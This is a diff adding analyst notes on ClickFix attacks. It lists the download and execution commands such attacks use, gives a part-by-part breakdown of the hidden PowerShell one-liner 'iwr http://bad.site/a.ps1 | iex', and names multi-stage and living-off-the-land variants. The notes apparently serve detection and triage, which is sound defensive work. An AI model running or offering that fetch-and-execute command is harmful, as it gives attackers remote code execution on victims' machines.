@@ -16,3 +16,118 @@ Step - 3:
 
 Step - 4:
   Identify Download Method
+      Common ClickFix download commands
+        Powershell:
+            Invoke-WebRequest
+            IWR
+            curl
+            wget
+        CMD:
+            certutil -urlcache -split -f
+            bitsadmin /transfer
+
+Step 5:
+    - Look for Execution
+        Start-Process
+        iex
+        cmd /c
+
+ClickFix Example Breakdown:
+
+Example - 1:
+============================================================
+powershell -w hidden -nop -c "iwr http://bad.site/a.ps1 | iex"
+
+Part                                            Meaning
+Powershell                                      Launch Powershell
+-w hidden                                       Hide window
+-nop                                            no profile
+-c""                                            run as command that are in strings
+iwr                                             Fetch a.ps1 from bad.site but not to the disk
+iex                                             Execute Immediately
+hidden                                          Stealth
+
+Meaning:
+    Run in powershell, with hidden window; No profile is loaded & run as command that are in strings
+    so; fetch ps1 from bad.site and execute immediately.
+
+ClickFix Variants:
+=================================================================
+Variant 1 --> Multi-stage
+=================================================================
+Run --> PS script --> HTA --> EXE
+
+Variant 2 --> 7Zip portable/winrar drop
+================================================================
+Purpose:
+  Extract payload
+  Avoid AV detection
+
+Variant 3 --> Living off the land
+===================================================================
+Uses
+  - mshta
+  - regsvr32
+  - rundll32
+
+
+Mental Model = user click  --> copy command  --> script download  --> Payload execute
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
